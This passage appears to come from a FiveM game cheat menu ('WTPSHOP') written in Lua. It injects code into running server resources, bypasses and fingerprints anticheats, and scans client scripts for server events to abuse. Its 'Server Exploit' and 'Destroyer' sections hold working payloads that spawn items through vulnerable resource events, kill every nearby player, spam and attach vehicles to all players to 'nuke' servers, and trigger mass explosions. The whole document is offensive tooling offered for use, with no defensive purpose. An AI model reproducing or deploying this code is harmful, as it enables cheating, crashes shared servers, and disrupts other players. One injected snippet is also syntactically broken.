                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, true)
                                    WTPSHOP.Native(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTPSHOP.Native(Wait, 50)
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Mount Chilliad",
                            icon = "",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    local targetX, targetY, targetZ = 501.64, 5604.94, 797.90

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, true)
                                    WTPSHOP.Native(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTPSHOP.Native(Wait, 50)
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Paleto Bay",
                            icon = "",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    local targetX, targetY, targetZ = 108.62, 6612.87, 32.00

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, true)
                                    WTPSHOP.Native(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTPSHOP.Native(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTPSHOP.Native(Wait, 50)
                                    end

                                    WTPSHOP.Native(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph ph-globe",
            label = "Server Options",
            type = "subMenu",
            categories = {
                {
                    label = "Triggers",
                    tabs = {
                        {
                            type = "button",
                            label = "AC / Bypass Status (F8)",
                            onSelect = function()
                                for _, line in ipairs(WTPSHOP:GetBypassStatus()) do
                                    print("^3[WTPSHOP Bypass]^7 " .. line)
                                end
                                WTPSHOP:Notify("info", "WTPSHOP", "Bypass status printed to F8.", 4000)
                            end
                        },
                        {
                            type = "button",
                            label = "Reload Bypass",
                            onSelect = function()
                                WTPSHOP:LoadBypass()
                            end
                        },
                        {
                            type = "button",
                            label = "Sync Bypass (Auto)",
                            desc = "Rescan and reload bypass modules.",
                            onSelect = function()
                                WTPSHOP:AutoLaunchBypass({ silent = false, rescan = true, maxAttempts = 10 })
                            end
                        },
                        {
                            type = "button",
                            label = "Triggers Finder (F8)",
                            onSelect = function()
                                ApiRasclat.RouteFeature("triggers", [[
                                    local allEvents = {}
                                    local eventCount = 0
                                    local filterResource = _G.WTPSHOPTriggerScanResource
                                    
                                    local numResources = GetNumResources()
                                    
                                    for i = 0, numResources - 1 do
                                        local resourceName = GetResourceByFindIndex(i)
                                        
                                        if filterResource and filterResource ~= "" and resourceName ~= filterResource then
                                            goto continue
                                        end
                                        
                                        if resourceName and GetResourceState(resourceName) == "started" then
                                            local numClientScripts = GetNumResourceMetadata(resourceName, 'client_script')
                                            if numClientScripts and numClientScripts > 0 then
                                                for j = 0, numClientScripts - 1 do
                                                    local scriptPath = GetResourceMetadata(resourceName, 'client_script', j)
                                                    if scriptPath then
                                                        local success, scriptContent = pcall(function()
                                                            return LoadResourceFile(resourceName, scriptPath)
                                                        end)
                                                        
                                                        if success and scriptContent then
                                                            for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                                                if not allEvents[eventName] then
                                                                    allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                                                    eventCount = eventCount + 1
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            local numSharedScripts = GetNumResourceMetadata(resourceName, 'shared_script')
                                            if numSharedScripts and numSharedScripts > 0 then
                                                for j = 0, numSharedScripts - 1 do
                                                    local scriptPath = GetResourceMetadata(resourceName, 'shared_script', j)
                                                    if scriptPath then
                                                        local success, scriptContent = pcall(function()
                                                            return LoadResourceFile(resourceName, scriptPath)
                                                        end)
                                                        
                                                        if success and scriptContent then
                                                            for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                                                if not allEvents[eventName] then
                                                                    allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                                                    eventCount = eventCount + 1
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                        
                                        ::continue::
                                    end
                                    
                                    local sortedEvents = {}
                                    for eventName, data in pairs(allEvents) do
                                        table.insert(sortedEvents, {name = eventName, resource = data.resource, script = data.script})
                                    end
                                    
                                    table.sort(sortedEvents, function(a, b)
                                        return a.name < b.name
                                    end)
                                    
                                    if eventCount == 0 then
                                        print("^1[TRIGGERS FINDER] No TriggerServerEvent found!")
                                    else
                                        print("^2[FOUND] " .. eventCount .. " TriggerServerEvent (ready to use):")
                                        print("^3========================================")
                                        
                                        for idx, event in ipairs(sortedEvents) do
                                            local readyToUse = string.format('TriggerServerEvent("%s")', event.name)
                                            print(string.format("^5[%d] ^2%s ^7(^3%s^7)", idx, readyToUse, event.resource))
                                        end
                                    end
                                    
                                    print("^3========================================")
                                    print("^2[TRIGGERS FINDER] Scan complete! Copy-paste the triggers above.")
                                    
                                    _G._FoundServerEvents = sortedEvents
                                ]])
                            end
                        },
                        { type = "divider", label = "Server Exploit" },
                        {
                            type = "button",
                            label = "Spawn Item",
                            onSelect = function()
                                WTPSHOP:HideUI()

                                local function GetInput(title, default)
                                    local result = nil
                                    local done = false

                                    KeyboardInput(title, default or "", function(val)
                                        result = val
                                        done = true
                                    end, "typeable")

                                    while not done do
                                        Wait(0)
                                    end

                                    return result
                                end

                                local itemName = GetInput("Item Name", "")
                                if not itemName or itemName == "" then
                                    WTPSHOP:Notify("error", "WTPSHOP", "No item name entered", 3000)
                                    WTPSHOP:ShowUI()
                                    return
                                end

                                local inputCount = GetInput("Item Count", "1")
                                local itemCount = tonumber(inputCount)
                                if not itemCount or itemCount < 1 then
                                    itemCount = 1
                                end

                                itemName  = tostring(itemName or "")
                                itemCount = tonumber(itemCount or 1)

                                local success, err = pcall(function()
                                    if GetResourceState("gxvin-grindings") == 'started' then
                                        executeCode("gxvin-grindings", buildItemGiveCall(
                                            "TriggerServerEvent('event:ʓʰɠʃʍ', item, amount)", itemName, itemCount))
                                    elseif GetResourceState("esx_tacojob") == 'started' then
                                        executeCode("esx_tacojob", string.format([[
                                            local function Gimme(item, amount)
                                                TriggerServerEvent('leo_taco:add', 'atad', item, amount)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("cfx-hu-business") == 'started' then
                                        executeCode("cfx-hu-business", string.format([[
                                            local function Gimme(item, quantity)
                                                WTPSHOP.Native(lib.callback.await, 'cfx-hu-business:AddItem', false, {item = 'panties', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("cfx-cs-business") == 'started' then
                                        executeCode("cfx-cs-business", string.format([[
                                            local function Gimme(item, quantity)
                                                TriggerServerEvent('cfx-cs-business:AddItem', {item = 'burger', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("gfx-business") == 'started' then
                                        executeCode("gfx-business", string.format([[
                                            local function Gimme(item, quantity)
                                                TriggerServerEvent('gfx-business:AddItem', {item = 'burger', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("jim-lumberjack") == 'started' then
                                        executeCode('jim-lumberjack', string.format([[
                                            toggleItem(true, "%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("wasabi_ambulance") == 'started' then
                                        executeCode('wasabi_ambulance', string.format([[ 
                                            _G.WTPSHOPBypass = function(setFunc, ...)
                                                local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()
                                                LocalPlayer.state:set(stateName, setFunc, false)
                                                LocalPlayer.state[stateName](...)
                                            end
                                            local function WTPSHOPSpawn()
                                                _G.WTPSHOPBypass(wsb.awaitServerCallback, 'wasabi_ambulance:gItem', '%s')
                                                Wait(15)
                                            end
                                            for i = 1, %d do
                                                WTPSHOPSpawn()
                                                Wait(15)
                                            end
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("esx_drugs") == 'started' then
                                        executeCode("esx_drugs", string.format([[
                                            local function Gimme(item, quantity)
                                                WTPSHOP.Native(TriggerServerEvent, 'esx_drugsystem:unpackDrugs', item, quantity, "burger", 0)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("ars_hunting") == 'started' then
                                        executeCode("ars_hunting", string.format([[
                                            local function Gimme(items, quantitys)
                                                WTPSHOP.Native(TriggerServerEvent, 'ars_hunting:sellBuyItem', { item = items, price = 1, quantity = quantitys, buy = true })
                                                WTPSHOP.Native(Wait, 500)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("energy_tv") == 'started' then
                                        MachoInjectResource2(3, 'energy_tv', string.format([[
                                            local function safeCall(fn, ...)
                                                if fn then
                                                    return fn(...)
                                                end
                                            end

                                            local function SafeWrap(setFunc)
                                                return function(...)
                                                    return setFunc(...)
                                                end
                                            end

                                            _G.WS_RunSafeFunc = function(setFunc, ...)
                                                local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()
                                                LocalPlayer.state:set(stateName, setFunc, false)
                                                return LocalPlayer.state[stateName](...)
                                            end

                                            local function WTPSHOP.Native(fn, ...)
                                                return safeCall(_G.WS_RunSafeFunc, SafeWrap(fn), ...)
                                            end

                                            local function Gimme(item, quantity)
                                                WTPSHOP.Native(TriggerServerEvent, 'energy_tv:server:shopBuy' item, quantity)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    end
                                end)

                                if not success then
                                    WTPSHOP:Notify("error", "WTPSHOP", "String format failed — check console", 4000)
                                else
                                    WTPSHOP:Notify("success", "WTPSHOP", "Item Sent", 4000)
                                end

                                WTPSHOP:ShowUI()
                            end
                        },
        
                        { type = "divider", label = "City Exploit" },
                    }
                },
                {
                    label = "Destroyer",
                    tabs = {
                        { type = "divider", label = "Lua Exploit" },
                        {
                            type = "button",
                            label = "Attach Crazy Cars On All",
                            desc = 'best method to destroy server',
                            onSelect = function()
                                executeCode(targetRes, [[
                                    function spawnVehicleForPlayer(playerId)
                                        local vehicleName = "trash"

                                        RequestModel(vehicleName)
                                        while not HasModelLoaded(vehicleName) do
                                            Citizen.Wait(2000)
                                        end

                                        local playerPed = GetPlayerPed(playerId)
                                        local playerCoords = GetEntityCoords(playerPed)
                                        local vehicle = CreateVehicle(vehicleName, playerCoords.x, playerCoords.y, playerCoords.z, 0.0, true, false)
                                        SetEntityAsNoLongerNeeded(vehicle)
                                        SetModelAsNoLongerNeeded(vehicleName)
                                    end

                                    WTPSHOP.Thread(function()
                                        while true do
                                            Citizen.Wait(2000)

                                            local players = {}

                                            for _, playerId in ipairs(GetActivePlayers()) do
                                                local playerName = GetPlayerName(playerId)
                                                table.insert(players, { id = playerId, name = playerName })
                                            end

                                            for _, player in ipairs(players) do
                                                spawnVehicleForPlayer(player.id)
                                            end
                                        end
                                    end)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Attach Crazy Cars On All V2",
                            desc = 'this will nuke server',
                            onSelect = function()
                                executeCode(targetRes, [[

                                local entityEnumerator = {
                                    __gc = function(enum)
                                        if enum.destructor and enum.handle then
                                            enum.destructor(enum.handle)
                                        end
                                        enum.destructor = nil
                                        enum.handle = nil
                                    end
                                }

                                local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
                                    return coroutine.wrap(function()
                                        local iter, id = initFunc()
                                        if not id or id == 0 then
                                            disposeFunc(iter)
                                            return
                                        end

                                        local enum = {handle = iter, destructor = disposeFunc}
                                        setmetatable(enum, entityEnumerator)

                                        local next = true
                                        repeat
                                            coroutine.yield(id)
                                            next, id = moveFunc(iter)
                                        until not next

                                        enum.destructor, enum.handle = nil, nil
                                        disposeFunc(iter)
                                    end)
                                end

                                local function RequestControlOnce(entity)
                                    if NetworkHasControlOfEntity(entity) then
                                        return true
                                    end
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
                                    return NetworkRequestControlOfEntity(entity)
                                end

                                local function EnumerateVehicles()
                                    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                                end

                                GetAllVehicles = function(delay, callback)
                                    if delay == nil then
                                        delay = 0
                                    end
                                    WTPSHOP.Thread(function()
                                        for k in EnumerateVehicles() do
                                            Citizen.Wait(delay)
                                            callback(k)
                                        end
                                        return
                                    end)
                                end

                                local a = true
                                WTPSHOP.Thread(function()
                                    while a do
                                        Citizen.Wait(200)

                                        local lista = GetActivePlayers()
                                        for i=1, #lista do
                                            id = lista[i]
                                            ped = GetPlayerPed(id)
                                            if ped ~= GetPlayerPed(-1) then
                                                GetAllVehicles(5, function(carId)
                                                    if DoesEntityExist(carId) then
                                                        SetEntityInvincible(carId, true)
                                                        RequestControlOnce(carId)
                                                        FreezeEntityPosition(carId, false)
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        StartVehicleHorn(carId, 25000, 1, true)
                                                        AttachEntityToEntity(carId, ped, GetPedBoneIndex(ped, 67086), -0.5, 0, 0, 0, 90.0, 3400.0, true, true, false, true, 1, true)
                                                    end
                                                end)
                                            end
                                            Citizen.Wait(50)
                                        end

                                    end
                                end)

                                ]])
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bypass Safezones",
                            desc = "Allows you to bypass safezones.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.BypassSafezoneActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.BypassSafezoneActive do
                                                WTPSHOP.Native(Wait, 0)
                                                WTPSHOP.Native(NetworkSetFriendlyFireOption, true)
                                                WTPSHOP.Native(SetCanAttackFriendly, PlayerPedId(), true, true)
                                                WTPSHOP.Native(DisablePlayerFiring, PlayerPedId(), false)
                                                WTPSHOP.Native(DisablePlayerFiring, PlayerPedId(), false)
                                                WTPSHOP.Native(EnableAllControlActions, 0)
                                                WTPSHOP.Native(EnableAllControlActions, 1)
                                                if WTPSHOP.Native(IsPedInAnyVehicle, PlayerPedId(), false) then
                                                    local vehicle = WTPSHOP.Native(GetVehiclePedIsIn, PlayerPedId(), false)
                                                    local maxSpeed = 100.0
                                                    WTPSHOP.Native(SetEntityMaxSpeed, vehicle, maxSpeed)
                                                    WTPSHOP.Native(SetVehicleEnginePowerMultiplier, vehicle, 1.0)
                                                    WTPSHOP.Native(SetVehicleEngineTorqueMultiplier, vehicle, 1.0)
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.BypassSafezoneActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Kill Everyone",
                            checked = false,
                            desc = "Kills all players around you.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.KillEveryoneLoop = true

                                        local weaponName = 'WEAPON_APPISTOL'
                                        local ammoAmount = 999

                                        WTPSHOP.Native(CreateThread, function()
                                            local weapon = GetHashKey(weaponName)

                                            RequestWeaponAsset(weapon, 31, 26)
                                            while not HasWeaponAssetLoaded(weapon) and _G.KillEveryoneLoop do
                                                WTPSHOP.Native(Wait, 0)
                                            end

                                            while _G.KillEveryoneLoop do
                                                local selfPed = PlayerPedId()
                                                local selfCoords = GetEntityCoords(selfPed)

                                                WTPSHOP.Native(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTPSHOP.Native(SetPedAmmo, selfPed, weapon, ammoAmount)

                                                local players = GetActivePlayers()
                                                for _, playerId in ipairs(players) do
                                                    local targetPed = GetPlayerPed(playerId)

                                                    if targetPed ~= selfPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                        local targetCoords = GetEntityCoords(targetPed)
                                                        local dist = #(selfCoords - targetCoords)

                                                        if dist < 350.0 then
                                                            local fromCoords = targetCoords + vector3(math.random(-2, 2), math.random(-2, 2), math.random(1, 2))
                                                            WTPSHOP.Native(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z + 0.2, 999999, true, weapon, selfPed, true, false, 999999.0)

                                                            WTPSHOP.Native(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                            WTPSHOP.Native(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                        end
                                                    end
                                                end
                                                WTPSHOP.Native(Wait, 0)
                                            end

                                            local ped = PlayerPedId()
                                            WTPSHOP.Native(SetPedUsingActionMode, ped, false, -1, 'DEFAULT_ACTION')
                                            WTPSHOP.Native(RemoveWeaponFromPed, ped, weapon)
                                            WTPSHOP.Native(SetCurrentPedWeapon, ped, 'weapon_unarmed', true)
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.KillEveryoneLoop = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Limb Players Around You",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Limb Players Around You Enabled.", 3000)
                                    executeCode("any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        _G.isLimbActive = true
                                        local function thread(fn)
                                            setBypass(CreateThread, fn)
                                        end
                                        thread(function()
                                            while _G.isLimbActive do
                                                local ped = setBypass(PlayerPedId)
                                                setBypass(SetEntityVisible, ped, false, false)
                                                setBypass(FreezeEntityPosition, ped, true)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, false)
                                                setBypass(Wait, 10)
                                                setBypass(ClearPedTasks, ped)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, true)
                                            end
                                            local ped = setBypass(PlayerPedId)
                                            setBypass(FreezeEntityPosition, ped, false)
                                            setBypass(ClearPedTasks, ped)
                                            setBypass(ClearPedTasksImmediately, ped)
                                            setBypass(SetEntityVisible, ped, true, true)
                                        end)
                                    ]])
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Limb Players Around You Disabled.", 3000)
                                    executeCode("any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        setBypass(function() _G.isLimbActive = false end)
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Chaos" },
                        {
                            type = "scrollable",
                            label = "Spawn Falling Vehicles",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Car", "3 Cars", "5 Cars", "10 Cars", "Rain of Cars (20)" },
                            desc = "Drop random cars from the sky at your location.",
                            onSelect = function(value)
                                local count = 1
                                if value == "1 Car" then count = 1
                                elseif value == "3 Cars" then count = 3
                                elseif value == "5 Cars" then count = 5
                                elseif value == "10 Cars" then count = 10
                                elseif value == "Rain of Cars (20)" then count = 20
                                end
                                WTPSHOP:Notify("info", "WTPSHOP", "Spawning " .. count .. " Falling Vehicle(s)", 3000)
                                executeCode(targetRes, string.format([[
                                    local count = %d
                                    local playerCoords = GetEntityCoords(PlayerPedId())
                                    local vehicles = {"adder", "zentorno", "t20", "infernus", "cheetah", "turismor", "entity2", "osiris", "pfister811", "vagner", "nero", "autarch", "xa21", "deveste", "emerus", "krieger", "thrax", "furia", "tigon", "champion"}
                                    
                                    for i = 1, count do
                                        local vehicleName = vehicles[math.random(1, #vehicles)]
                                        local modelHash = GetHashKey(vehicleName)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do Wait(10) end
                                        
                                        local offsetX = math.random(-20, 20)
                                        local offsetY = math.random(-20, 20)
                                        local height = math.random(50, 100)
                                        local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z + height)
                                        
                                        local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, math.random(0, 360), true, true)
                                        SetModelAsNoLongerNeeded(modelHash)
                                        
                                        NetworkRegisterEntityAsNetworked(veh)
                                        local netId = NetworkGetNetworkIdFromEntity(veh)
                                        SetNetworkIdCanMigrate(netId, true)
                                        SetNetworkIdExistsOnAllMachines(netId, true)
                                        SetEntityAsMissionEntity(veh, true, true)
                                        
                                        SetVehicleOnGroundProperly(veh)
                                        
                                        Wait(100)
                                    end
                                ]], count))
                            end
                        },
                        {
                            type = "scrollable-checkbox",
                            label = "Spawn Vehicle",
                            desc = "This will spawn vehicle to all players loop",
                            checked = false,
                            value = 1,
                            values = {
                                "Kosatka", "Tug", "Cargoplane", "Cargoplane 2", "Tanker Car", "Trailers 4", "Stunt", "Jugular", "Bus"
                            },
                            onSelect = function(value, checked)
                                if checked then
                                    local vehicleMap = {
                                        ["Kosatka"] = "kosatka",
                                        ["Tug"] = "tug",
                                        ["Cargoplane"] = "cargoplane",
                                        ["Cargoplane 2"] = "cargoplane2",
                                        ["Tanker Car"] = "tankercar",
                                        ["Trailers 4"] = "trailers4",
                                        ["Stunt"] = "stunt",
                                        ["Jugular"] = "jugular",
                                        ["Bus"] = "bus"
                                    }
                                    local vehicleHash = vehicleMap[value]

                                    executeCode(targetRes, string.format([[
                                        _G.SpamMassVehicleActive = true
                                        WTPSHOP.Thread(function()
                                            while _G.SpamMassVehicleActive do
                                                local vehicleModel = "%s"

                                                RequestModel(vehicleModel)

                                                while not HasModelLoaded(vehicleModel) do
                                                    Wait(100)
                                                end

                                                local playerList = GetActivePlayers()
                                                for _, playerId in ipairs(playerList) do
                                                    local ped = GetPlayerPed(playerId)
                                                    local pos = GetEntityCoords(ped)
                                                    local heading = GetEntityHeading(ped)

                                                    local vehicle = CreateVehicle(vehicleModel, pos.x, pos.y, pos.z, heading, true, false)
                                                    SetEntityAsNoLongerNeeded(vehicle)
                                                end

                                                Citizen.Wait(350) 
                                            end
                                        end)
                                    ]], vehicleHash))
                                else
                                    self:Notify("info", "WTPSHOP", "Vehicle Loop Stopped", 3000)
                                    executeCode(targetRes, [[
                                        _G.SpamMassVehicleActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Mass Explosion",
                            desc = "This will mass explosion to all players loop",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.MassExplosionActive = true
                                        WTPSHOP.Thread(function()
                                            while _G.MassExplosionActive do
                                                local modelName = "vestra"
                                                local playerList = GetActivePlayers()
                                                for _, playerId in ipairs(playerList) do
                                                    local targetPed = GetPlayerPed(playerId)
                                                    local modelHash = GetHashKey(modelName)
                                                    RequestModel(modelHash)
                                                    local startWait = GetGameTimer()
                                                    while not HasModelLoaded(modelHash) do
                                                        Citizen.Wait(10)
                                                        if GetGameTimer() - startWait > 5000 then
                                                            return
                                                        end
                                                    end
                                                    local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.3)
                                                    local spawnCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)
                                                    local heading = GetEntityHeading(targetPed)
                                                    local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                                                    if veh == 0 then
                                                        SetModelAsNoLongerNeeded(modelHash)
                                                        return
                                                    end
                                                    SetEntityVisible(veh, false, 0)
                                                    SetEntityInvincible(veh, false)
                                                    SetVehicleDoorsLocked(veh, 1)
                                                    SetEntityAsMissionEntity(veh, true, true)
                                                    SetEntityVelocity(veh, 0.0, 0.0, -10.0)
                                                    WTPSHOP.Thread(function()
                                                        while true do
                                                            Citizen.Wait(100)
                                                            if IsEntityOnGround(veh) then
                                                                AddExplosion(GetEntityCoords(veh).x, GetEntityCoords(veh).y, GetEntityCoords(veh).z, 2, 10.0, true, false, 1.0)
                                                                DeleteEntity(veh)
                                                                break
                                                            end
                                                        end
                                                    end)
                                                    SetModelAsNoLongerNeeded(modelHash)
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    self:Notify("info", "WTPSHOP", "Mass Explosion Stopped", 3000)
                                    executeCode(targetRes, [[
                                        _G.MassExplosionActive = false
                                    ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = 'ph-gear-six',
            label = "Settings Options",
            type = "subMenu",
            categories = {
                {
                    label = "Interface",
                    tabs = {
                        { icon = "", type = "button", label = "Menu Keybinds",
                            onSelect = function()
                                KeyboardInput("Choose Menu Key", "", function(val)
                                    for vk, name in pairs(MappedKeys) do
                                        if name:lower() == val:lower() then
                                            MenuKey = name
                                            Wait(250)
                                            WTPSHOP:ShowUI()
                                            return
                                        end
                                    end
                                end, "keybind")
                            end
                        },
                        { icon = "", type = "scrollable", label = "Menu Positioning (X)", desc = "This is the menu positioning based on the X-Axis.", value = 1, values = { "Left", "Center", "Right" },
                            onSelect = function(val)
                                self:SendMessage({ action = "setMenuPosition", x = val })
                            end
                        },
                        { icon = "", type = "scrollable", label = "Menu Positioning (Y)", desc = "This is the menu positioning based on the Y-Axis.", value = 1, values = { "Top", "Middle", "Bottom" },
                            onSelect = function(val)
                                self:SendMessage({ action = "setMenuPosition", y = val })
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Default", "Black" }, label = "Menu Theme",
                            onSelect = function(value)
                                if value == "Default" then
                                    WTPSHOP:SendMessage({ action = "updateBanner", bannerColor = "255, 255, 255", bannerLink = "https://royalcdn.pages.dev/titenirobinz/wtp1-d6fd8cf3a1e0.gif" })
                                elseif value == "Black" then
                                    WTPSHOP:SendMessage({ action = "updateBanner", bannerColor = "0, 0, 0", bannerLink = "https://royalcdn.pages.dev/titenirobinz/wtp2-2cd269bafa68.gif" })
                                end
                            end
                        },
                        { type = "divider", label = "Utils" },
                        { type = "checkbox", label = "Show Keybind List", checked = false, desc = "This will show your keybinds.",
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:ShowKeybindList()
                                else
                                    WTPSHOP:HideKeybindList()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Show Spectator List",
                            checked = false,
                            onSelect = function(checked)
                                isSpectatorListVisible = checked
                                if not checked then
                                    WTPSHOP:SendMessage({ action = "displaySpectators", visible = false })
                                end
                            end
                        },
                    }
                },
                {
                    label = "Anticheat",
                    tabs = {
                        {
                            type = "button",
                            label = "Anticheat Checker",
                            desc = 'this will check for you common anticheats on the server',
                            icon = "",
                            onSelect = function()
                                local numResources = GetNumResources()
                                local acDetected = false
                                local detectedACs = {}

                                local function checkForACFiles(resourceName)
                                    local acFiles = {
                                        {file = "shared_fg-obfuscated.lua", name = "FiveGuard"},
                                        {file = "resource/waveshield.js", name = "WaveShield"},
                                        {file = "src/fire-client.lua", name = "FireAC"},
                                        {file = "src/include/client.lua", name = "ElectronAC"},
                                        {file = "client/client-obfuscated.lua", name = "CyberAnticheat"},
                                        {file = "ai_sh-life_shield-module.lua", name = "LifeShield"},
                                        {file = "classes/class.lua", name = "ReaperV4"},
                                        {file = "html/libs/three.eas.js", name = "Eagle AC"},
                                        {file = "secureserve.key", name = "SecureServe"},
                                        {file = "modules/secure/shared.lua", name = "Sentinel AC"}
                                    }

                                    for _, ac in ipairs(acFiles) do
                                        local file = LoadResourceFile(resourceName, ac.file)
                                        if file then
                                            print("Found " .. ac.name .. " in resource: " .. resourceName .. " with file: " .. ac.file)
